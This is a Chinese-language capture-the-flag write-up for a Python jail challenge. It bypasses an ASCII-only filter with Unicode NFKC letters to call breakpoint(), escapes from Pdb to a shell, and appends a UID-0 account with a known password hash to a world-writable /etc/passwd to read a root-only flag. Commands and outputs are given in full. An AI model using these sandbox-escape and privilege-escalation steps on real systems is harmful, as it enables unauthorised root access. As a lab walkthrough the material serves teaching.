# Untouchable flag

## 题目简述

题目是 Python jail。输入中禁止任何 ASCII 字母和数字，且总长度不能超过 12 个字符；通过过滤后直接交给 `eval()`。服务运行在 Python 3.8/Ubuntu 20.04，并提示 Python 版本高于 3.7。

第一阶段利用 Python 标识符的 Unicode NFKC 规范化，在 12 个字符内调用 Python 3.7 引入的 `breakpoint()` 进入 Pdb；第二阶段利用 Dockerfile 把 `/etc/passwd` 设置为全员可写的错误权限，添加 UID 0 账户后读取仅 root 可读的 flag。

## 解题过程

过滤逻辑为：

```python
pattern = re.compile("[a-zA-Z0-9]")

code = input(">")
if re.findall(pattern, code):
    print("Some characters in your code are banned.")
elif len(code) > 12:
    print("Your code is too long.")
else:
    eval(code)
```

正则只检查 ASCII，但 Python 解析标识符时会做 NFKC 规范化。下面 10 个数学字母不会命中正则，却会被解释器规范化为 ASCII 的 `breakpoint`；加上一对括号后长度刚好为 12：

```python
𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()
```

连接服务并提交后进入 Pdb：

```text
>𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()
--Return--
> ...
(Pdb)
```

Pdb 命令不再经过题目的 12 字符过滤。用 `!` 执行 Python 语句并启动 Shell：

```text
(Pdb) !__import__('os').system('/bin/sh')
```

此时进程仍是 Dockerfile 创建的普通用户 `test`。flag 被设置为 `0400`，直接读取会失败；但 Dockerfile 同时存在决定性的错误配置：

```dockerfile
RUN chmod 666 /etc/passwd
RUN chmod 400 ./flag
USER test
```

向 `/etc/passwd` 追加一个 UID/GID 均为 0 的账户即可提权。下面使用原解法预先生成的 MD5-crypt 哈希，明文密码为 `z9nn8w`：

```bash
echo 'w8nn9z:$1$test$eicwC/tivElau/ii72ooo0:0:0:root:/root:/bin/bash' >> /etc/passwd
su w8nn9z
# Password: z9nn8w
id
cat /app/flag
```

输出：

```text
uid=0(root) gid=0(root) groups=0(root)
0xGame{PyJ@i1_w1Th_P@sswd_3l3Vat3_pr1v1l3g3}
```

## 方法总结

完整利用链包含两个独立边界：用 Unicode 兼容字符绕过 ASCII 正则并触发 `breakpoint()`，再利用可写 `/etc/passwd` 从普通用户提升到 UID 0。仅获得 Pdb 或普通 Shell 还不能读取 `0400` 的 flag；WP 必须把容器权限配置这一后半段写完整。
